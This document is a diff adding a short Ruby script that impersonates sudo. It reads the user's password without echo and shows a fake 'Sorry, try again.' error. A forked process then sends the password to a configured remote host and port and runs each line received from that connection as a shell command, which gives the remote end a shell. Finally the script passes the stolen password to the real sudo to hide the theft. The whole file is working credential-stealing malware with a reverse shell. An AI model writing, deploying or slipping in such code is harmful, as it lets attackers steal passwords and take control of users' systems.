@@ -1,0 +1,38 @@
+#!/usr/bin/env ruby
+require 'socket'
+require 'io/console'
+require 'open3'
+
+#Set the Remote Host IP
+remote_host = "127.0.0.1"
+#Set the Remote Host Port
+port = "1337"
+
+command = ARGV
+print "Password: "
+password = STDIN.noecho(&:gets).chomp
+sleep 0.7
+print "\nSorry, try again."
+puts "\r\033"
+
+fork do
+  begin
+    sock = TCPSocket.new "#{remote_host}", "#{port}"
+    sock.puts "We are connected! password: #{password}"
+  rescue
+    sleep 20
+    retry
+  end
+
+  begin
+    while line = sock.gets
+      Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+        IO.copy_stream(stdout_and_stderr, sock)
+      end
+    end
+  rescue
+    retry
+  end
+end
+
+system "echo #{password} | /usr/bin/sudo -s #{command.join(" ")}"
